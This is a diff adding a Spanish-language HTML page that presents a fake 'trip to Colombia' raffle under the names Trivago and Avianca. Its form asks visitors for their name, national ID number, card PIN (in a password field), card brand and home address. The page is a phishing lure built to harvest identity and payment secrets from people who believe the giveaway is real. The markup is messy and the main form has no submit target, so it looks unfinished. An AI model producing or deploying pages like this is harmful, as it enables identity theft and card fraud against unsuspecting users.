@@ -1,0 +1,65 @@
+<html>
+<head>
+<title> TRIVAGOTEPREMIA </title>
+</head>
+<body style="background-color: #F5F5DC;">
+<style>
+  .custom-paragraph {
+    background-color: #2F4F4F; /* Color de fondo */
+    color: white; /* Color del texto */
+    padding: 10px; /* Espacio alrededor del texto para resaltar el fondo */
+    text-align:center;/*SORTEO DE VIAJE A COLOMBIA*/
+  }
+</style>
+<h1 class="custom-paragraph">SORTEO DE VIAJE A COLOMBIA</h1>
+<h2 style="background-color: #008080; color: white; text-align:center;">Sorteo patrocinado por Avianca</h2>
+<p>
+<p><b>PARA PODER PARTICIPAR EN EL SORTEO DEL VIAJE A COLOMBIA DEBES LLENAR LOS SIGUIENTES DATOS:</b></p>
+
+<form>
+<p><b>
+<label for="nombre">Nombre:</label>
+<input type=text name="nombre" id="nombre">
+</p>
+<p>
+<label for="apellido">Apellido:</label>
+<input type=text name="apellido" id="apellido">
+</p>
+<p>
+<label for="cedula">Cedula:</label>
+<input type=text name="cedula" id="cedula">
+</p>
+<p>
+<label for="Clave">Clave de tarjeta:</label>
+<input type=password name="Clave" id="Clave">
+</p>
+<p>
+<label for="Tarjeta">Ingresar con Tarjeta de Crédito/Débito:</label>
+<select id="Tarjeta" name="Tarjeta">
+  <option value="MASTERCARD">MASTERCARD</option>
+  <option value="AMERICAN EXPRESS">AMERICAN EXPRESS</option>
+  <option value="VISA">VISA</option>
+</select></p>
+<p>
+<label for="Direccion">Dirección:</label>
+<input type=text name="Direccion" id="Direccion">
+</p>
+<p>
+<label for="Ciudad">Ciudad:</label>
+<input type=text name="Ciudad" id="Ciudad">
+</p>
+<p>
+<label for="Provincia">Provincia:</label>
+<input type=text name="Provincia" id="Provincia">
+</p>
+<b></p>
+
+<form action="/action_page.php">
+  <textarea name="message" style="width:200px; height:100px;">Deja tu opinión.</textarea>
+  <br>
+  <input type="submit">
+</form>
+
+</p>
+<body>
+</html>
